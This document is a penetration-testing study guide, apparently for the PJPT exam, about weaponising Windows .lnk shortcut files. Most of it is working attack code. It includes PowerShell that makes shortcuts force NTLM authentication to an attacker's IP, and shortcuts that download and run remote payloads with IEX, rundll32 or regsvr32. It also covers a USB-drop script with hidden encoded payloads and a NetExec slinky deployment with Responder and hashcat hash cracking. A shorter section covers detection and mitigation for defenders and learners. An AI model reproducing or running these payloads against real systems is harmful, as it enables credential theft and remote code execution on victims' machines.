# LNK File Attacks

## Overview
LNK file attacks exploit Windows shortcut files (.lnk) to perform various malicious activities including credential theft, code execution, and lateral movement. These attacks are particularly effective in corporate environments where users frequently interact with shared folders and shortcuts.

## What are LNK Files?

### Definition
- **LNK Files**: Windows shortcut files that point to other files, folders, or applications
- **Extension**: .lnk (usually hidden in Windows Explorer)
- **Function**: Provide quick access to resources without storing the actual file
- **Risk**: Can be weaponized to execute malicious code or steal credentials

### Attack Vectors

#### 1. UNC Path Credential Theft
- **Technique**: LNK files pointing to UNC paths force NTLM authentication
- **Result**: Captures user credentials when file is accessed
- **Target**: NetNTLM hashes for cracking or relay attacks

#### 2. Code Execution
- **Technique**: LNK files can execute malicious commands
- **Result**: Command execution, payload download, persistence
- **Target**: Initial access or privilege escalation

#### 3. Social Engineering
- **Technique**: Disguised LNK files appear as legitimate documents
- **Result**: User interaction triggers malicious payload
- **Target**: Phishing campaigns, USB drops

## Creating Malicious LNK Files

### Method 1: PowerShell LNK Creation (From Screenshot)
```powershell
# Create malicious LNK file with UNC path for credential theft
PS C:\Windows\system32> $objShell = New-Object -ComObject WScript.shell
PS C:\Windows\system32> $lnk = $objShell.CreateShortcut("C:\test.lnk")
PS C:\Windows\system32> $lnk.TargetPath = "\\192.168.138.149\@test.png"
PS C:\Windows\system32> $lnk.WindowStyle = 1
PS C:\Windows\system32> $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
PS C:\Windows\system32> $lnk.Description = "Test"
PS C:\Windows\system32> $lnk.HotKey = "Ctrl+Alt+T"
PS C:\Windows\system32> $lnk.Save()

# Result: Creates test.lnk that forces NTLM auth to 192.168.138.149
# When user clicks the shortcut, their credentials are sent to attacker
```

### Method 2: Command Line LNK Creation
```cmd
# Create LNK file using PowerShell one-liner
powershell -c "$o=New-Object -c WScript.Shell;$l=$o.CreateShortcut('malicious.lnk');$l.TargetPath='\\ATTACKER_IP\share\file.exe';$l.IconLocation='%SystemRoot%\system32\shell32.dll,3';$l.Save()"

# Create LNK with embedded command execution
powershell -c "$o=New-Object -c WScript.Shell;$l=$o.CreateShortcut('document.lnk');$l.TargetPath='cmd.exe';$l.Arguments='/c powershell -enc JABjAGwAaQBlAG4AdAA...';$l.IconLocation='%SystemRoot%\system32\imageres.dll,2';$l.Save()"
```

### Method 3: LNK File Properties Breakdown
```powershell
# Understanding LNK file components:

# TargetPath - What the shortcut points to
$lnk.TargetPath = "\\192.168.138.149\@test.png"  # UNC path for credential theft
$lnk.TargetPath = "cmd.exe"                      # Direct command execution
$lnk.TargetPath = "powershell.exe"               # PowerShell execution

# Arguments - Parameters passed to the target
$lnk.Arguments = "/c calc.exe"                   # CMD arguments
$lnk.Arguments = "-enc <base64_payload>"         # PowerShell encoded command
$lnk.Arguments = "-w hidden -c <command>"        # Hidden window execution

# IconLocation - Icon displayed to user
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"     # Folder icon
$lnk.IconLocation = "%windir%\system32\imageres.dll, 2"    # Document icon
$lnk.IconLocation = "%windir%\system32\shell32.dll, 1"     # File icon

# WindowStyle - How window appears
$lnk.WindowStyle = 1    # Normal window
$lnk.WindowStyle = 3    # Maximized window  
$lnk.WindowStyle = 7    # Minimized window (hidden)
```

## Automated LNK Deployment

### Method 4: NetExec/CrackMapExec Slinky Module
```bash
# Automated LNK file deployment using NetExec (formerly CrackMapExec)
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -M slinky -o NAME=testtest SERVER=192.168.138.149

# Command breakdown:
# netexec smb [TARGET_IP] - SMB protocol attack
# -d marvel.local - Domain name
# -u fcastle - Username (from previous Kerberoasting/credential theft)
# -p Password1 - Password (cracked or obtained)
# -M slinky - Load slinky module for LNK file creation
# -o NAME=testtest - Name of the LNK file to create
# -o SERVER=192.168.138.149 - Attacker's server for UNC path

# What this does:
# 1. Authenticates to target system using provided credentials
# 2. Automatically creates malicious LNK file named "testtest"
# 3. LNK file points to UNC path \\192.168.138.149\share
# 4. Places LNK file in accessible location on target
# 5. When user clicks LNK, credentials are sent to 192.168.138.149
```

### Slinky Module Parameters
```bash
# Common slinky module options:
netexec smb TARGET -d DOMAIN -u USER -p PASS -M slinky -o NAME=filename SERVER=attacker_ip

# Parameters explained:
# NAME=filename - Name of the LNK file (without .lnk extension)
# SERVER=attacker_ip - IP address where credentials will be sent
# Optional parameters:
# SHARE=sharename - Custom share name (default: share)
# CLEANUP=true - Remove LNK file after execution
```

### Complete Automated Attack Chain
```bash
# 1. Credential Discovery (from previous attacks)
# Example: fcastle:Password1 from Kerberoasting

# 2. Setup credential capture on attacker machine  
responder -I eth0 -wrf
# OR
impacket-smbserver -smb2support share $(pwd)

# 3. Deploy malicious LNK files to multiple targets
netexec smb 192.168.138.0/24 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=important_document SERVER=192.168.138.149

# 4. Monitor for credential capture
# Responder will capture NetNTLM hashes when users click LNK files

# 5. Crack captured hashes
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Attack Scenarios

### Scenario 1: Credential Harvesting via UNC Path
```powershell
# 1. Create malicious LNK file pointing to attacker's server
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\Users\Public\Important_Document.lnk")
$lnk.TargetPath = "\\192.168.1.100\@important.docx"
$lnk.IconLocation = "%windir%\system32\imageres.dll, 2"  # Document icon
$lnk.Description = "Important Company Document"
$lnk.Save()

# 2. Place LNK file in shared folder or send via email
# Copy to: \\fileserver\shared\Important_Document.lnk

# 3. Setup credential capture on attacker machine
# Using Responder:
responder -I eth0 -wrf

# 4. When user clicks shortcut:
# - Windows attempts to access \\192.168.1.100\@important.docx
# - NTLM authentication is forced
# - User's NetNTLM hash is captured by Responder
# - Hash can be cracked or used in relay attacks
```

### Scenario 2: Command Execution via LNK
```powershell
# Create LNK file that executes PowerShell payload
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\Users\Public\System_Update.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = '-w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.100/payload.ps1\")"'
$lnk.IconLocation = "%windir%\system32\shell32.dll, 21"  # Security shield icon
$lnk.Description = "System Security Update"
$lnk.WindowStyle = 7  # Minimized (hidden)
$lnk.Save()

# When executed:
# - Runs PowerShell in hidden window
# - Downloads and executes payload from attacker server
# - Payload can be reverse shell, persistence mechanism, etc.
```

### Scenario 3: USB Drop Attack
```powershell
# Create multiple LNK files for USB drop campaign
$targets = @(
    @{Name="Resume.lnk"; Icon="2"; Desc="My Resume"},
    @{Name="Photos.lnk"; Icon="4"; Desc="Holiday Photos"}, 
    @{Name="Confidential.lnk"; Icon="54"; Desc="Confidential Documents"}
)

foreach($target in $targets) {
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("E:\$($target.Name)")
    $lnk.TargetPath = "cmd.exe"
    $lnk.Arguments = '/c powershell -w hidden -c "Start-Process powershell -Args \"-enc <base64_payload>\" -WindowStyle Hidden"'
    $lnk.IconLocation = "%windir%\system32\imageres.dll, $($target.Icon)"
    $lnk.Description = $target.Desc
    $lnk.WindowStyle = 7
    $lnk.Save()
}
```

## Advanced LNK Techniques

### Technique 1: LNK File with Multiple Payloads
```powershell
# LNK file that performs multiple actions
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\temp\multi_payload.lnk")
$lnk.TargetPath = "cmd.exe"
$lnk.Arguments = '/c powershell -c "Start-Process calc.exe; Start-Sleep 2; IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")"'
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Save()

# Executes calculator (decoy) then downloads real payload
```

### Technique 2: Environment Variable Abuse
```powershell
# Use environment variables to hide true target
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\temp\hidden_target.lnk")
$lnk.TargetPath = "%COMSPEC%"  # Points to cmd.exe
$lnk.Arguments = '/c set "target=\\192.168.1.100\payload.exe" && call "%target%"'
$lnk.IconLocation = "%windir%\system32\imageres.dll, 2"
$lnk.Save()
```

### Technique 3: Living Off The Land
```powershell
# Use legitimate Windows binaries
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\temp\legitimate.lnk")
$lnk.TargetPath = "rundll32.exe"
$lnk.Arguments = 'url.dll,OpenURL "http://192.168.1.100/malicious.hta"'
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Save()

# Alternative using regsvr32
$lnk.TargetPath = "regsvr32.exe"
$lnk.Arguments = '/s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll'
```

## Detection and Analysis

### Analyzing Suspicious LNK Files
```powershell
# PowerShell script to analyze LNK files
function Analyze-LNK($lnkPath) {
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut($lnkPath)
    
    Write-Host "=== LNK Analysis ==="
    Write-Host "File: $lnkPath"
    Write-Host "Target: $($lnk.TargetPath)"
    Write-Host "Arguments: $($lnk.Arguments)"
    Write-Host "Working Directory: $($lnk.WorkingDirectory)"
    Write-Host "Icon: $($lnk.IconLocation)"
    Write-Host "Description: $($lnk.Description)"
    Write-Host "Window Style: $($lnk.WindowStyle)"
    Write-Host "Hotkey: $($lnk.HotKey)"
    
    # Check for suspicious indicators
    if($lnk.TargetPath -match "\\\\") {
        Write-Host "[SUSPICIOUS] UNC path detected - potential credential theft" -ForegroundColor Red
    }
    if($lnk.Arguments -match "powershell|cmd|rundll32") {
        Write-Host "[SUSPICIOUS] Command execution detected" -ForegroundColor Red
    }
    if($lnk.WindowStyle -eq 7) {
        Write-Host "[SUSPICIOUS] Hidden window execution" -ForegroundColor Red
    }
}

# Usage
Analyze-LNK "C:\suspicious.lnk"
```

### Network Monitoring for LNK Attacks
```bash
# Monitor for SMB connections to unusual hosts
# Look for Event ID 5140 (Network share accessed) in Windows logs

# Wireshark filter for UNC path authentication
smb2.cmd == 1 && ip.dst == ATTACKER_IP

# Monitor for unusual PowerShell executions
# Event ID 4103 (PowerShell module logging)
# Event ID 4104 (PowerShell script block logging)
```

## Mitigation Strategies

### Group Policy Mitigations
```bash
# Disable automatic execution of LNK files from untrusted locations
# Computer Configuration > Administrative Templates > Windows Components > File Explorer
# "Turn off Windows+X hotkeys" - Enabled

# Restrict UNC path access
# Computer Configuration > Administrative Templates > System > Group Policy
# "Configure user Group Policy loopback processing mode" - Enabled

# Block execution from removable media
# Computer Configuration > Administrative Templates > System > Removable Storage Access
# "Removable Disks: Deny execute access" - Enabled
```

### File System Mitigations
```powershell
# Monitor LNK file creation in sensitive directories
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users\Public\"
$watcher.Filter = "*.lnk"
$watcher.EnableRaisingEvents = $true

Register-ObjectEvent -InputObject $watcher -EventName Created -Action {
    $path = $Event.SourceEventArgs.FullPath
    Write-Host "New LNK file created: $path" -ForegroundColor Yellow
    # Analyze the LNK file
    Analyze-LNK $path
}
```

### Network Mitigations
```bash
# Block outbound SMB connections to internet
# Windows Firewall rules to block ports 445, 139 outbound

# Implement network segmentation
# Prevent workstations from communicating with external SMB servers

# Monitor and alert on unusual network connections
# SIEM rules for SMB connections to external IPs
```

## PJPT Exam Tips

### For the PJPT Exam
1. **LNK files are excellent for credential harvesting**
   - Easy to create and deploy
   - High success rate in corporate environments
   - Can be combined with other attacks

2. **Common deployment methods**:
   - Shared folders
   - Email attachments
   - USB drops
   - Web downloads

3. **Key components to document**:
   - LNK creation method
   - Target path (UNC or executable)
   - Icon masquerading technique
   - Deployment location

4. **Integration with other attacks**:
   - Combine with Responder for credential capture
   - Use with SMB relay attacks
   - Chain with payload delivery

5. **Practical PJPT workflow**:
   ```powershell
   # 1. Create malicious LNK
   $objShell = New-Object -ComObject WScript.shell
   $lnk = $objShell.CreateShortcut("document.lnk")
   $lnk.TargetPath = "\\ATTACKER_IP\@file.pdf"
   $lnk.IconLocation = "%windir%\system32\imageres.dll, 2"
   $lnk.Save()
   
   # 2. Deploy to target (shared folder, email, etc.)
   # 3. Setup credential capture (Responder)
   # 4. Wait for user interaction
   # 5. Capture and crack/relay credentials
   ```

---

**Note**: Always ensure proper authorization before conducting LNK file attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 